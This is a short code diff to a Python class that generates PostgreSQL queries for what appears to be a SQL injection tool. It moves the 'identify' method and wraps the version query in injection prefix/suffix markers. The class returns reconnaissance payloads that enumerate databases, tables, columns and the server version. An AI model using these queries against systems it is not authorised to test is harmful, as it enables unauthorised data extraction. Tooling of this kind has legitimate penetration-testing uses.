@@ -5,15 +5,11 @@ class SQLInjectionEnginePostgreSQL(SQLInjectionEngine):
     def __init__(self) -> None:
         super().__init__()
 
-    @property
-    def identify(self) -> str:
-        return "EXISTS(SELECT datname FROM pg_database)"
-
     def database_names(self) -> str:
         return "SELECT datname FROM pg_catalog.pg_database"
 
     def version(self):
-        return "SELECT version()"
+        return f"SELECT CONCAT('{SQLInjectionEngine.injection_prefix}', 'version:',version(), '{SQLInjectionEngine.injection_suffix}')"
 
     def tables(self) -> str:
         return "SELECT table_name FROM information_schema.tables"
@@ -22,3 +18,7 @@ class SQLInjectionEnginePostgreSQL(SQLInjectionEngine):
         if table_name is None:
             raise AssertionError("Table name cannot be null")
         return f"SELECT * FROM information_schema.columns WHERE table_name = '{table_name}'"
+
+    @staticmethod
+    def identify() -> str:
+        return "EXISTS(SELECT datname FROM pg_database)"
